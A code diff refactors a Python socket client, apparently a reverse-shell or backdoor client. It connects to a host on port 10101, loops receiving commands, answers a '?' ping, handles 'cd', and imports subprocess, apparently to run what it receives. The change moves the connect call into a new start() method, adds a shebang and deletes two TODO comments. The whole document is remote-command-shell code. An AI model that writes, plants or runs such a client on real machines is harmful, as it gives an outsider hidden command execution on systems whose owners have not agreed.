@@ -1,3 +1,5 @@
+#!/usr/bin/python
+
 import os
 import socket
 import subprocess
@@ -10,13 +12,14 @@ class Client(object):
     def __init__(self, host="127.0.0.1"):
         self.host = host
         self.sckt = socket.socket()
+
+    def start(self):
         self.sckt.connect((self.host, 10101))
+        self.receive_commands()
 
     def receive_commands(self):
         while True:
             data = self.sckt.recv(1024)
-            # store decoded data as separate variable
-            # check how to return to home directory with "cd"
             if data.decode("utf-8") == "?":
                 self.sckt.send("!")
             elif data[:2].decode("utf-8") == "cd":
@@ -37,7 +40,7 @@ class Client(object):
 
 def main():
     client = Client("127.0.0.1")
-    client.receive_commands()
+    client.start()
 
 
 if __name__ == "__main__":
